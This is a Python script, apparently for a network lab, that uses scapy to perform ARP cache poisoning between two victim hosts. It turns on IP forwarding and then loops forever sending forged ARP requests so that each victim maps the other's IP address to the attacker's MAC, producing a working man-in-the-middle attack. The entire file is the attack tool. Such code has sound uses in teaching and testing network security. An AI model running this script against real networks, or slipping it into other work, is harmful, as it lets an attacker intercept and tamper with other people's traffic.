import scapy.all as scapy
import sys
import os
import time
import argparse
import netifaces as ni

parser = argparse.ArgumentParser(description="Attacking script to be run in xterm.")
parser.add_argument(
    "-i",
    "--interface",
    type=str,
    help="Interface of the attacker",
    default="attacker-eth0",
)
parser.add_argument(
    "--victim1-ip",
    type=str,
    help="Victim 1's IP address",
    default="10.0.0.1",
)
parser.add_argument(
    "--victim2-ip",
    type=str,
    help="Victim 2's IP address",
    default="10.0.0.2",
)


def set_ip_forwarding(value):
    os.system(f"echo {value} > /proc/sys/net/ipv4/ip_forward")


def mitm():
    global attacker_MAC
    # victim1_MAC, victim2_MAC = "9e:66:59:00:42:90", "76:11:48:10:93:a9"
    print("[*] Poisoning Targets...")

    # attacker pretends as victim 1 and asks for victim 2's MAC
    pkt1 = scapy.Ether(src=attacker_MAC, dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(
        op=1,
        hwsrc=attacker_MAC,
        psrc=victim1_IP,
        pdst=victim2_IP,
    )

    # attacker pretends as victim 2 and asks for victim 1's MAC
    pkt2 = scapy.Ether(src=attacker_MAC, dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(
        op=1,
        hwsrc=attacker_MAC,
        psrc=victim2_IP,
        pdst=victim1_IP,
    )
    pkt1.show()
    pkt2.show()

    packet_count = 0
    while 1:
        scapy.sendp(pkt1)
        scapy.sendp(pkt2)
        print(f"{packet_count} packets sent", end="\r")
        time.sleep(1.5)
        packet_count += 1


if __name__ == "__main__":
    args = parser.parse_args()
    interface = args.interface
    attacker_IP = ni.ifaddresses(interface)[ni.AF_INET][0]["addr"]
    attacker_MAC = ni.ifaddresses(interface)[ni.AF_LINK][0]["addr"]
    victim1_IP = args.victim1_ip
    victim2_IP = args.victim2_ip

    print(f"Attacker: (IP={attacker_IP}, MAC={attacker_MAC})")

    set_ip_forwarding(1)
    mitm()
